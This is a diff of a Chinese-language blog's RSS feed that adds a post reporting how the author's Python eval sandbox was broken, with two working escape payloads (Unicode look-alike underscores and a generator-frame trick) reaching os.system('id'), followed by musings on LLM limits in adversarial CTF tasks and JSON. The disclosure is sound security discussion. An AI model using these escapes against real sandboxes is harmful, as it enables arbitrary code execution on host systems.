@@ -1,5 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0"><channel><title>est の 输入 输出和出入</title><link>https://blog.est.im/</link><description>This blog is rated 🔞, viewer discretion is advised</description><lastBuildDate>Tue, 24 Mar 2026 01:58:40 +0800</lastBuildDate><item><title>发明后训练的人真是天才</title><link>https://blog.est.im/2026/stderr-12</link><description>&lt;p&gt;有了AI很多东西摸索得比多，也是快速记录一下。&lt;/p&gt;
+<rss version="2.0"><channel><title>est の 输入 输出和出入</title><link>https://blog.est.im/</link><description>This blog is rated 🔞, viewer discretion is advised</description><lastBuildDate>Wed, 25 Mar 2026 21:40:00 +0800</lastBuildDate><item><title>无用之用——或许LLM真的还不是AGI</title><link>https://blog.est.im/2026/stdin-08</link><description>&lt;p&gt;之前记录的 &lt;a href="https://blog.est.im/2026/stdout-09"&gt;安全的Python3沙箱——eval&lt;/a&gt; 被人破解了。&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-python"&gt;[
+    c._﹍init﹍_._﹍globals﹍_[&amp;quot;os&amp;quot;].system(&amp;quot;id&amp;quot;)
+    for c in ()._﹍class﹍_._﹍bases﹍_[0]._﹍subclasses﹍_()
+    if c._﹍init﹍_._﹍class﹍_._﹍name﹍_ == &amp;quot;function&amp;quot;
+    and &amp;quot;os&amp;quot; in c._﹍init﹍_._﹍globals﹍_
+]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;或&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-python"&gt;(
+    L:=[None],
+    g:=(x.gi_frame.f_back.f_back.f_builtins for x in L),
+    L.clear(),
+    L.append(g),
+    bi:=g.send(None),
+    bi['_'+'_import_'+'_']('os').system('id')
+)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其实 opus-4.6-thinking 当时提到了类似思路，但可惜miss了一丁点。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;AI想到的unicode是 U+FF3F 失败了，这里的 ﹍是 U+FE4D成功了。&lt;/li&gt;
+&lt;li&gt;AI考虑到 gi_frame  但是没能成功写完整。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;看到这里我不仅哑然，距离成功就差临门一脚那么一点，但是AI终究不是AGI。人类在钻研死劲上还是胜过AI的。&lt;/p&gt;
+&lt;p&gt;AI会不会有一些根本性的模式限制呢？我猜现阶段就是它最不太适应的就是这种对抗性的CTF。&lt;/p&gt;
+&lt;p&gt;pretrain有个 reward model，只预测出一个最恰当的token。RLHF也是高度按照人类喜好去pick一个标准答案的。但是有些任务不是这样的，是全局试错然后留意着，说不定以后从candidate做个奇妙的组合，加工发挥，就有大用。&lt;/p&gt;
+&lt;p&gt;今年开篇第一篇也写过《&lt;a href="https://blog.est.im/2026/stderr-01"&gt;LLM的弱点——不能很好的讲笑话&lt;/a&gt;》，恰如 LLM产生随机数能力很弱。因为它真的不会去随便挑个角度开始讲笑话，但群众喜闻乐见的「冷笑话」就是这样，冷不丁来一个，笑死人。笑点很奇怪。&lt;/p&gt;
+&lt;p&gt;LLM过度讨好，就发现不了这种。而且即便发现了也不会记录搜藏用在下一次。。&lt;/p&gt;
+&lt;p&gt;CTF和讲笑话一样，没有最优解。恰好是偶然你从一个刁钻的角度入手，可能一开始很不起眼，但是你能解决问题&lt;/p&gt;
+&lt;p&gt;A -&amp;gt; B 死胡同&lt;br /&gt;
+C -&amp;gt; D 死胡同&lt;/p&gt;
+&lt;p&gt;B+D居然能解决E。&lt;/p&gt;
+&lt;p&gt;所以我感觉现阶段LLM是擅长「优化」类任务，把做到极致。但是搜集启发式的活儿，第一是它pretrain没这么教，第二是教了它也不会搜集，memory得靠外挂。&lt;/p&gt;
+&lt;p&gt;或许人类以后的工作，狩猎式的活儿不用做了，可以去采集类的。如同 CTF奇怪路径某一天突然串通了可以构造一个 exploit，也如同多个违背预期结合可以构成一个笑话&lt;/p&gt;
+&lt;p&gt;无用之用方为大用？哈哈哈&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;又刷到这篇 &lt;a href="https://blog.cloudflare.com/code-mode/"&gt;we've all been using MCP wrong&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;我个人是有切身体会的。AI 其实对 JSON 这种格式掌握一点都不好，经常写出有语法错误的。我现在完全放弃用JSON跟AI交互了，都改为 markdown 段落章节形式了&lt;/p&gt;
+&lt;p&gt;谁知道，AI居然不习惯JSON这样机械严格的东西，反而喜欢接近自然语言宽松的格式。&lt;/p&gt;
+&lt;p&gt;Cloudflare博客也强调，与其教AI去调用MCP，不如让AI写对应的代码去调用MCP。AI更习惯写代码。这和Claude某些bash党的观点不谋而合，因为AI培训班就是大量代码和自然文本，JSON其实反而说得少，不习惯啊。&lt;/p&gt;
+&lt;p&gt;从这个角度说，JSON都写不好的AI，还想什么AGI呢。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">est</dc:creator><pubDate>Wed, 25 Mar 2026 21:40:00 +0800</pubDate><guid isPermaLink="false">tag:None,2026-03-25:/2026/stdin-08</guid><category>stdin</category></item><item><title>发明后训练的人真是天才</title><link>https://blog.est.im/2026/stderr-12</link><description>&lt;p&gt;有了AI很多东西摸索得比多，也是快速记录一下。&lt;/p&gt;
 &lt;p&gt;问1：你的 system prompt 里有明确指出你是个 AI 吗&lt;br /&gt;
 问2：一个 LLM 的 system prompt 如果没显式指出是AI，AI 能发现自己是AI吗？ &lt;br /&gt;
 问3：一个 LLM 的 system prompt 如果没显式指出是AI，pre-train 也把所有明显AI助手的语料删除，RLHF 的时候也不考察AI自我角色定位， AI 能发现自己是AI吗？ &lt;/p&gt;
@@ -783,7 +823,9 @@ By the end of 2027, it threatened every business model predicated on intermediat
 &lt;p&gt;AI 很厉害的一点，超级接近成功了，它找到了突破双下划线的方法，用 str.format()&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;('{0._' + '_class_'  + '_}').format(())&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;但是这个只能拿来读到 attributes，并不能调用。&lt;/p&gt;
-&lt;p&gt;不知道我的设定是不是有问题，ChatGPT虽然也失败了，但是还是嘴犟，说我可以[0]*1e1000 搞爆你内存，所以你那玩意仍然不安全 🤣 sama家的真是打死不认输&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">est</dc:creator><pubDate>Sun, 15 Feb 2026 11:56:00 +0800</pubDate><guid isPermaLink="false">tag:None,2026-02-15:/2026/stdout-09</guid><category>stdout</category></item><item><title>isomorphic-git 实现 sparse checkout &amp; commit</title><link>https://blog.est.im/2026/stdout-08</link><description>&lt;p&gt;去年9月&lt;a href="https://blog.est.im/2025/stdout-07"&gt;手搓了套blog评论系统 - req4cmt&lt;/a&gt;，可能是全世界很少见通过 git repo 文件本身存储评论内容，而不是 github issue。&lt;/p&gt;
+&lt;p&gt;不知道我的设定是不是有问题，ChatGPT虽然也失败了，但是还是嘴犟，说我可以[0]*1e1000 搞爆你内存，所以你那玩意仍然不安全 🤣 sama家的真是打死不认输&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;2026-3-25 &lt;a href="https://blog.est.im/2026/stdin-08"&gt;更新&lt;/a&gt;：已&lt;a href="https://news.ycombinator.com/item?id=47511916"&gt;被farlow破解&lt;/a&gt;。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">est</dc:creator><pubDate>Sun, 15 Feb 2026 11:56:00 +0800</pubDate><guid isPermaLink="false">tag:None,2026-02-15:/2026/stdout-09</guid><category>stdout</category></item><item><title>isomorphic-git 实现 sparse checkout &amp; commit</title><link>https://blog.est.im/2026/stdout-08</link><description>&lt;p&gt;去年9月&lt;a href="https://blog.est.im/2025/stdout-07"&gt;手搓了套blog评论系统 - req4cmt&lt;/a&gt;，可能是全世界很少见通过 git repo 文件本身存储评论内容，而不是 github issue。&lt;/p&gt;
 &lt;p&gt;git repo 文件 append 内容涉及到一个性能问题：repo作为整体，也就是历史所有全体评论，被 fetch, commit , push 的成本太高。如果只能修改其中的一个文件就好了。这就是 sparse checkout。git底层早就支持了，git 命令在2020年之后2.25.0+支持，但是 Cloudflare Worker 没法执行命令，也没文件系统，于是召唤AI跟我一起折腾。&lt;/p&gt;
 &lt;p&gt;大概用的这个 prompt：&lt;/p&gt;
 &lt;blockquote&gt;
@@ -885,74 +927,4 @@ Person C says to B: &lt;strong&gt;&lt;em&gt;_&lt;/em&gt;&lt;/strong&gt;__&lt;/p&
 &lt;/blockquote&gt;
 &lt;p&gt;这几轮下来，我感觉可以得出一个结论，AI对 pronoun shift 容易犯错，注意力不够集中。各位拿AI来训练英语的要小心了。&lt;/p&gt;
 &lt;p&gt;Transformer 是基于概率吐字的，he/she 这种高频词对AI来说大差不差。所以胡诌一个。LLM对于这种强指向、 强因果的关联性基本靠蒙。&lt;/p&gt;
-&lt;p&gt;这是我已知的LLM的第三个硬缺陷了。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">est</dc:creator><pubDate>Sun, 25 Jan 2026 16:13:00 +0800</pubDate><guid isPermaLink="false">tag:None,2026-01-25:/2026/stdout-06</guid><category>stdout</category></item><item><title>今日被AI拷打</title><link>https://blog.est.im/2026/stderr-05</link><description>&lt;p&gt;群里朋友发了一个AI拷打的prompt。做完了一轮觉得没啥，要睡觉了后劲来了。必须得记录些什么。这狗日的语言模型蹦几个金句是真的让人印象深刻&lt;/p&gt;
-&lt;p&gt;我一直有个毛病是 fear of loss，损失厌恶。&lt;/p&gt;
-&lt;p&gt;AI提醒我，我能不能用一个必不后悔的方式，先占位？&lt;/p&gt;
-&lt;p&gt;其实它这句说得有点绕，我觉得更进一步应该说，不能以我当下的情况去评估可能的风险，而是假设将来回头看，会不会为没能冒险感到后悔？&lt;/p&gt;
-&lt;p&gt;然后又聊到人际关系，我觉得最难处的就当官的和小人。AI提醒我，处处留痕才能克小人。我恍然大悟，原来官僚流程才是小人克星。啊这。😂 &lt;/p&gt;
-&lt;p&gt;反而理解当官的为啥不喜欢“讲真话”，而是要讲权责，讲先例，讲文件，讲上级态度。能打败官僚的只能抬出更多的规定、流程和制度 🤣 &lt;/p&gt;
-&lt;p&gt;我又问，遇到满嘴仁义道德胡搅蛮缠，不讲事实不讲道理的人怎么办，AI这么说的：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;如果对方赢得不干净，靠身份、道德话术、权威叙事，则要让对方在完全合法、体面、无人可指责的情况下，被自己的叙事反噬。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;呃，好吧。的确你去当面冲撞，taunt都是自寻死路。&lt;/p&gt;
-&lt;p&gt;拉扯一段时间后，问了AI哪些方向比较好，答：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;方向&lt;/th&gt;
-&lt;th&gt;原因&lt;/th&gt;
-&lt;th&gt;你的匹配点&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;strong&gt;数字化/轻资产工具类产品&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;可快速测试，低成本迭代，信息差可利用&lt;/td&gt;
-&lt;td&gt;MVP闭环 + 最小代价策略&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;strong&gt;社区/兴趣/垂直社交&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;不依赖巨额营销，靠小众高粘性用户增长&lt;/td&gt;
-&lt;td&gt;策略闭环 + 并行模拟用户行为&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;strong&gt;教育/技能增值/内容变现&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;经济下行，个人投资教育热度不减，长期价值&lt;/td&gt;
-&lt;td&gt;干扰可控，闭环迭代，信息差变现&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;strong&gt;AI+效率工具/生产力优化&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;高不确定环境下企业/个人仍需效率工具&lt;/td&gt;
-&lt;td&gt;你的效率和策略优势可直接落地&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;strong&gt;供应链/本地化创新产品&lt;/strong&gt;&lt;/td&gt;
-&lt;td&gt;避免全球不确定性风险&lt;/td&gt;
-&lt;td&gt;可最小投入实验，本地化可控&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;blockquote&gt;
-&lt;p&gt;不太适合：高社交不可控、高成本非刚需娱乐项目（比如大规模社交APP赌爆款），尤其在下行周期和政策不确定背景下。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;最后，我看到了&lt;a href="https://news.ycombinator.com/item?id=46690402"&gt;HN的&lt;/a&gt;一篇文章《I'm addicted to being useful》，突然意识到，工程师容易陷入一种喜欢充当"useful"而不是 "valuable"的角色。&lt;/p&gt;
-&lt;p&gt;你有用，别人就把你用到死。你有价值，别人就尊你三分。&lt;/p&gt;
-&lt;p&gt;好吧。上价值了是吧。关于价值，最近几年最让我醍醐灌顶的，一是从pg那本《Hackers and Painters》里读到，价值都是劳动创造的。&lt;/p&gt;
-&lt;p&gt;第二，价值是什么？最近几年也看到个经典段子。上海广州为啥赚钱，人家有好东西卖你；北京为啥有钱？它能让你赚不了钱。&lt;/p&gt;
-&lt;p&gt;AI一针见血的指出：&lt;/p&gt;
-&lt;p&gt;价值 ≠ 有意义的想法&lt;br /&gt;
-价值 ≠ 正确&lt;br /&gt;
-价值 ≠ 高认知&lt;br /&gt;
-价值 ≠ 别人听了觉得“牛逼”&lt;/p&gt;
-&lt;p&gt;价值只取决于一件事：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;有没有人愿意、持续地，为它付出代价。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;惊呆了。AI甚至抛出一句：负向价值是不可避免的文明防腐层。&lt;/p&gt;
-&lt;p&gt;我不服，几轮交战后，我承认AI是对的。创造当然是价值第一动力，人类创造的第一个负向价值机制，便是产权。&lt;/p&gt;
-&lt;p&gt;也就是私有制。&lt;/p&gt;
-&lt;p&gt;私有制是好是坏，这个话题实属键政101了。简单的说，多劳多得是人类底色，如果干多干少一个样，干好干坏没差别，那么谈何劳动和创造？&lt;/p&gt;
-&lt;p&gt;产权本身不创造任何东西。&lt;/p&gt;
-&lt;p&gt;当然，所有的腐败，也是不创造任何价值的。&lt;/p&gt;
-&lt;p&gt;带着这一轮的恍惚，我不得不呼呼大睡。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">est</dc:creator><pubDate>Wed, 21 Jan 2026 00:35:00 +0800</pubDate><guid isPermaLink="false">tag:None,2026-01-21:/2026/stderr-05</guid><category>stderr</category></item></channel></rss>
+&lt;p&gt;这是我已知的LLM的第三个硬缺陷了。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">est</dc:creator><pubDate>Sun, 25 Jan 2026 16:13:00 +0800</pubDate><guid isPermaLink="false">tag:None,2026-01-25:/2026/stdout-06</guid><category>stdout</category></item></channel></rss>
